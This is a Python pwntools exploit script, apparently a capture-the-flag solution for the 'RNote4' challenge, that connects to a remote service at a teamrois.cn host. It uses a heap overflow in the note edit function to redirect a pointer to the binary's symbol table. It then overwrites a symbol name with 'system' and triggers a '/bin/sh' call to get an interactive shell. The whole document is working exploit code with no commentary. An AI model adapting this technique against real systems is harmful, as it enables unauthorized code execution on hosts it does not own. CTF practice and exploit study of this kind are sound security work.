from pwn import *

#p = process(["./RNote4"])
p = remote("rnote4.2018.teamrois.cn", "6767")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = "./RNote4"

def alloc(size, data):
    p.send("\x01")
    p.send(size)
    p.send(data)

def edit(idx, size, data):
    p.send("\x02")
    p.send(idx)
    p.send(size)
    p.send(data)

alloc("\x30", "A" * 0x30)
alloc("\x30", "B" * 0x30)
alloc("\x30", "/bin/sh;" + "C" * 0x28)

bss = 0x602200
symtab = 0x601eb0

payload = "A" * 0x38 + p64(0x21) + p64(0x30) + p64(symtab)
edit("\x00", "\x50", payload)
edit("\x01", "\x08", p64(bss))

payload = "A" * 0x38 + p64(0x21) + p64(0x30) + p64(bss)
edit("\x00", "\x50", payload)

payload = "A" * 0x5f + "system\x00"
edit("\x01", p8(len(payload)), payload)

p.send("\x03")
p.send("\x02")

p.interactive()
